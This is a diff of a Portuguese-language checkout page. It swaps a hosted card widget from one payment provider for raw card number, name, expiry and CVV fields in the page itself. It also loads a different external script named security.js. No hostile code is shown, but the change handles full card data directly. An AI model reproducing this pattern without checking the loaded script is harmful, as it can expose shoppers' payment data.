@@ -65,7 +65,7 @@ body{background:linear-gradient(180deg,#e9eeea 0,#f6f7f5 320px,#f6f7f5 100%)}
 .tabs em{font-style:normal;font-size:10px;font-weight:800;background:var(--g);color:#fff;padding:3px 8px;border-radius:20px;text-transform:uppercase;margin-left:auto}
 .panel{border:1.5px dashed var(--line);border-radius:14px;padding:14px;background:#fcfdfc}
 .panel p{margin:0;color:var(--mut);font-size:14px}
-#card-element{min-height:110px}
+#card-fields{margin:0}
 .cerr{color:var(--r);font-size:13px;font-weight:700;min-height:18px;margin-top:6px}
 .pixbox{text-align:center}
 .pixbox h2{justify-content:center}
@@ -140,7 +140,12 @@ body{background:linear-gradient(180deg,#e9eeea 0,#f6f7f5 320px,#f6f7f5 100%)}
       </div>
       <div id="pnPix" class="panel"><p>Ao confirmar, mostramos o <b>QR Code</b> e o código <b>copia e cola</b> aqui mesmo. A aprovação é imediata.</p></div>
       <div id="pnCard" class="panel" hidden>
-        <div id="card-element"></div>
+        <div class="f" id="card-fields">
+          <label class="s6">Número do cartão<input id="cnum" inputmode="numeric" autocomplete="cc-number" placeholder="0000 0000 0000 0000" maxlength="23"></label>
+          <label class="s6">Nome impresso no cartão<input id="cnome" autocomplete="cc-name" placeholder="COMO ESTÁ NO CARTÃO" style="text-transform:uppercase"></label>
+          <label class="s3">Validade<input id="cval" inputmode="numeric" autocomplete="cc-exp" placeholder="MM/AA" maxlength="5"></label>
+          <label class="s3">CVV<input id="ccvv" inputmode="numeric" autocomplete="cc-csc" placeholder="123" maxlength="4"></label>
+        </div>
         <div id="parcWrap" hidden style="margin-top:10px"><label style="font-size:13px;font-weight:700">Parcelas<select id="parcSel"></select></label></div>
         <div class="cerr" id="cardErr" aria-live="polite"></div>
       </div>
@@ -199,7 +204,7 @@ body{background:linear-gradient(180deg,#e9eeea 0,#f6f7f5 320px,#f6f7f5 100%)}
 <script src="js/icons.js"></script>
 <script src="js/config.js"></script>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcode-generator/1.4.4/qrcode.min.js"></script>
-<script src="https://js.pagou.ai/payments/v3.js"></script>
+<script src="https://js.fastsoftbrasil.com/security.js"></script>
 <script src="js/pedido.js"></script>
 </body>
 </html>
